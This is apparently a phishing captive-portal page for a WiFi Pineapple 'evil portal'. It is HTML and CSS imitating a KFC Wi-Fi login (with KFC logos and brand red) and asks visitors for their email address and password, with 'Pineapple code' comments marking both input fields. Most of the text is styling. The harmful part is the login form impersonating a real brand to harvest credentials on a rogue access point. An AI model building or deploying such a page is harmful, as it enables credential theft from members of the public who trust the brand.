...
@media screen and (-webkit-min-device-pixel-ratio:0) {
    select {
        -webkit-appearance: none; height:30px; line-height:20px !important; 
...
.app_android_bg {background-image:url('"img/upload/kfc_bg.jpg"'); background-position:center top; background-attachment:Fixed; background-repeat:no-repeat;  min-height:100%; -webkit-background-size:cover; -moz-background-size:cover; -o-background-size:cover; background-size:cover}
.app_android_logo {padding-top: 30px; max-width:250px; max-height:120px; height: auto; background-image:url('"img/upload/kfc_logo.png"'); background-repeat:no-repeat;}
...
.YD{display:inline-block; vertical-align: baseline; box-sizing: border-box; border-bottom:5px solid #e4002b; padding-bottom:2px; border-right:1px solid #CCCCCC;}
.PP{display:inline-block; vertical-align: baseline; box-sizing: border-box; border-bottom:5px solid #e4002b; padding-bottom:2px;}
.nsel{color:#000000 !important; text-decoration:none;}
.sel{color:#000000 !important; text-decoration:none;}
.selborder{border-bottom:5px solid #e4002b;}
...
.Submit,.Submit2 {
	...
	padding:7px 7px;
	text-decoration:none;
	text-shadow:0px 0px 0px #e4002b;  /* Text Shadow Colour */
	cursor:pointer;
	width:100%;
...
.chk:hover input ~ .chkboxm {
  background-color: #e4002b;
  border:1px solid #e4002b;
}

/* When the checkbox is checked, add a background */
.chk input:checked ~ .chkboxm {
  background-color: #e4002b;
  border: 1px solid #e4002b;
}
...
.chk input:checked ~ .chkboxm:after {
  display: block;
}
...
/* On mouse-over, add a grey background color */
.radio:hover input ~ .radio_chkboxm {
  background-color: #ccc;
}

/* When the radio button is checked, add a blue background */
.radio input:checked ~ .radio_chkboxm {
  background-color: #e4002b;
...
.radio input:checked ~ .radio_chkboxm:after {
  display: block;
}

/* Style the indicator (dot/circle) */
.radio .radio_chkboxm:after {
  top: 6px;
  left: 6px;
  width: 8px;
  height: 8px;
...
.main_area {
	...
	margin-top:5px;
	width:90%;}
.input_table {width:96%;padding:0 5px 5px 5px}
.main {width:100%;}
...
<img src="assets/img/kfc_logo.png" class="logo" style="max-width:90%;max-height:180px;height:auto;padding:10px 0px 5px 0px;" alt="Wi-Fi KFCtt"></div>
 ...
 <table class="main_table" border="0" align="center" cellpadding="2" cellspacing="2">
  ...
  <table cellpadding="0" cellspacing="0" border="0" align="center" class="input_table">
   ...
   <input type="email" name="email" class="emailinput emerror" placeholder="Email Address" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required="required"><br> <!-- Pineapple code --></div></td>
   </tr>
   <tr>
   ...
   <input type="password" name="password" class="emailinput" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required="required"><br> <!--Pineapple code --> </div></td>
   </tr>
   <tr>
    <td class="spacer"><img src="assets/img/admin/spacer.gif" width="1" height="4" /></td>
   </tr>
   ...
   <label class="chk" for="chkbox">I agree to the T's and C's and confirm I am over the age of 13.
   <input type="checkbox" value="tnc" name="tnc" id="chkbox" required />
   <span class="chkboxm"></span>
   </label></td>
   </tr>
   <tr>
    <td class="spacer"><img src="assets/img/admin/spacer.gif" width="1" height="1" /></td>
